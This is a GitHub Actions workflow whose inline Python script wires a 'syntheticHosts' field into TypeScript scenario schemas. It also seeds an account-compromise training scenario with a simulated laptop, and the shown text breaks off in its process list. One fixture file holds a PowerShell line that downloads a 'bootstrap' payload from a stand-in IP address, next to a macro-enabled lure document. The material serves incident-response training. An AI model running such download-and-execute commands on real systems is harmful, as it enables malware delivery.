name: Wire Range scenario schema

on:
  pull_request:
    branches:
      - main

permissions:
  contents: write

jobs:
  wire:
    if: github.head_ref == 'feat/range-workspace'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: feat/range-workspace
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Wire synthetic hosts into scenario contracts
        run: |
          python - <<'PY'
          from pathlib import Path
          import json

          schema_path = Path('packages/schema/src/scenario.ts')
          schema = schema_path.read_text()

          if 'from "./syntheticHost"' not in schema:
              marker = 'import {\n  scenarioObjectiveSchema,\n} from "./scenarioObjective";\n'
              insertion = marker + '\nimport {\n  syntheticHostScenarioSchema,\n} from "./syntheticHost";\n'
              if marker not in schema:
                  raise SystemExit('scenario objective import marker not found')
              schema = schema.replace(marker, insertion, 1)

          if 'syntheticHosts:' not in schema:
              marker = '    initialWorld:\n      scenarioWorldSeedSchema,\n'
              insertion = marker + '    syntheticHosts:\n      z.array(syntheticHostScenarioSchema)\n        .default([]),\n'
              if marker not in schema:
                  raise SystemExit('scenario spec initialWorld marker not found')
              schema = schema.replace(marker, insertion, 1)

          schema_path.write_text(schema)

          runtime_path = Path('packages/simulation/src/scenario.ts')
          runtime = runtime_path.read_text()

          if 'SyntheticHostState' not in runtime:
              marker = 'import type {\n  WorldState,\n} from "./worldState";\n'
              insertion = marker + '\nimport type {\n  SyntheticHostState,\n} from "./syntheticHost";\n'
              if marker not in runtime:
                  raise SystemExit('world state import marker not found')
              runtime = runtime.replace(marker, insertion, 1)

          if '  syntheticHosts?:\n' not in runtime:
              marker = '  initialWorld: WorldState;\n\n'
              insertion = marker + '  syntheticHosts?:\n    readonly SyntheticHostState[];\n\n'
              if marker not in runtime:
                  raise SystemExit('ScenarioDefinition initialWorld marker not found')
              runtime = runtime.replace(marker, insertion, 1)

          runtime_path.write_text(runtime)

          scenario_path = Path('apps/web/public/scenarios/account-compromise.json')
          payload = json.loads(scenario_path.read_text())
          scenario = payload['scenario']

          if not scenario.get('syntheticHosts'):
              scenario['syntheticHosts'] = [
                  {
                      'deviceId': 'device-fin-lt-04',
                      'capabilities': [
                          'read:filesystem',
                          'read:processes',
                          'read:services',
                          'read:identity',
                          'read:configuration',
                          'read:logs',
                          'read:network',
                          'manage:services',
                          'terminate:process',
                          'quarantine:file',
                      ],
                      'files': [
                          {
                              'path': '/Users/smartinez/Downloads/QuarterlyReview.docm',
                              'content': 'Synthetic macro-enabled quarterly review document used by the incident scenario.',
                              'sha256': '4a7fdc7f3d8be6c1a911d6f407e82f9f812a2ec71bf1d7fd925f6dfd5320b4f3',
                              'owner': 'smartinez',
                              'group': 'Users',
                              'mode': 'rw-r--r--',
                              'createdAt': '2026-08-20T15:02:54Z',
                              'modifiedAt': '2026-08-20T15:03:04Z',
                              'quarantined': False,
                          },
                          {
                              'path': '/Users/smartinez/AppData/Local/Temp/finance-update.ps1',
                              'content': '# synthetic artifact\nInvoke-WebRequest https://203.0.113.77/bootstrap -UseBasicParsing',
                              'sha256': '9e6c9d2f14d2178fd2f7fbf7712c610d53c67c84f2ed8086697245db4f73fa1b',
                              'owner': 'smartinez',
                              'group': 'Users',
                              'mode': 'rw-r--r--',
                              'createdAt': '2026-08-20T15:03:14Z',
                              'modifiedAt': '2026-08-20T15:03:18Z',
                              'quarantined': False,
                          },
                          {
                              'path': '/Windows/System32/drivers/etc/hosts',
                              'content': '127.0.0.1 localhost\n::1 localhost',
                              'owner': 'SYSTEM',
                              'group': 'Administrators',
                              'mode': 'rw-r--r--',
                              'quarantined': False,
                          },
                      ],
                      'processes': [
                          {
                              'pid': 1020,
                              'image': 'C:\\Windows\\explorer.exe',
                              'commandLine': 'C:\\Windows\\explorer.exe',
                              'accountId': 'account-smartinez',
                              'state': 'running',
                              'startedAt': '2026-08-20T14:53:00Z',
